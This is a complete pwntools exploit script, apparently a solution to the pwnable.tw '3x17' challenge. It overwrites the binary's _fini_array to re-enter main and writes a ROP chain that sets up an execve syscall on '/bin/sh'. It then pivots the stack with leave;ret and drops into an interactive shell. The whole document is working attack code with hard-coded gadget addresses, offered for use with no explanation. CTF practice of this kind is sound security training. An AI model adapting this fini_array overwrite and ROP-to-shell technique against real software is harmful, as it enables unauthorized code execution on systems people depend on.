from pwn import *
r = process('./3x17')
#r = remote('chall.pwnable.tw', 10105)

def write(addr, data):
    r.recvuntil('addr:')
    r.sendline(str(addr))
    r.recvuntil('data:')
    r.send(data)

_fini_array_addr = 0x4b40f0
_fini_array_caller = 0x402960
_main_addr = 0x401b6d
leave_ret = 0x401c4b
syscall = 0x4022b4
pop_rdi = 0x401696
pop_rsi = 0x406c30
pop_rax = 0x41e4af
pop_rdx = 0x446e35
bin_sh = _fini_array_addr + 88
write(_fini_array_addr, p64(_fini_array_caller) + p64(_main_addr)) #overwrite _fini_array with caller
# _main_address is the ret func off _fini_array_caller

write(_fini_array_addr + 16, p64(pop_rdx) + p64(0))
write(_fini_array_addr + 32, p64(pop_rsi) + p64(0))
write(_fini_array_addr + 48, p64(pop_rax) + p64(0x3b))
write(_fini_array_addr + 64, p64(pop_rdi) + p64(bin_sh))
write(_fini_array_addr + 80, p64(syscall) + b'/bin/sh\x00')
write(_fini_array_addr, p64(leave_ret))
r.interactive()
